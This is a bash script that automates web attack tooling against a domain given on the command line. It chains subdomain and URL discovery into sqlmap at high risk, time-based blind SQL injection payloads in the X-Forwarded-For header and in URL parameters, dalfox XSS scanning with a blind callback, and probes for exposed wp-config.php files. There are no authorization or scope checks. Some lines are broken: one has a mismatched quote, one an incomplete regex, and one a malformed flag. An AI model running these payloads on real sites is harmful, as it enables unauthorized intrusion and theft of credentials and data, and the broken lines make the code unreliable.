#!/bin/bash

function find_sql_vuln {
    echo "Finding SQL vulnerabilities..."
    subfinder -d $1 -silent -all | gau -blacklist ttf,woff,svg,png | sort -u | gf sqli > gf_sqli.txt
    sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt
}

function header_blind {
    echo "Finding Header Blind vulnerabilities..."
    cat $1 | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13’
}

function time_based {
    echo "Finding Time-Based Blind SQL Injection vulnerabilities..."
    cat $1 | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
}

function extract_urls {
    echo "Extracting URLs from source code..."
    curl "$1" | grep -oP '(https*.://|www\.)[^]*'
}

function xss {
    echo "Finding XSS vulnerabilities..."
    cat $1 | gau --subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind $2
}

function find_js_endpoint {
    echo "Finding endpoints in JavaScript files..."
    katana -u $1 -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
}

function wp_config {
    echo "Checking for wp-config.php files..."
    subfinder -silent -d $1 | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code
}

function info_disclosure_json {
    echo "Finding Information Disclosure in JSON body..."
    cat $1 | waybackurls | httpx -mc 200 -ct | grep application/json
}

while [[ $# -gt 0 ]]; do
    key="$1"
    case $key in
        --find-sql-vuln)
        find_sql_vuln "$2"
        shift
        shift
        ;;
        --header-blind)
        header_blind "$2"
        shift
        shift
        ;;
        --time-based)
        time_based "$2"
        shift
        shift
        ;;
        --extract-urls)
        extract_urls "$2"
        shift
        shift
        ;;
        --xss)
        xss "$2" "$3"
        shift
        shift
        shift
        ;;
        --find-js-endpoint)
        find_js_endpoint "$2"
        shift
        shift
        ;;
        --wp-config)
        wp_config "$2"
        shift
        shift
        ;;
        --info-disclosure-json)
        info_disclosure_json "$2"
        shift
        shift
        ;;
        *)
        echo "Invalid option: $1"
        exit 1
        ;;
    esac
done
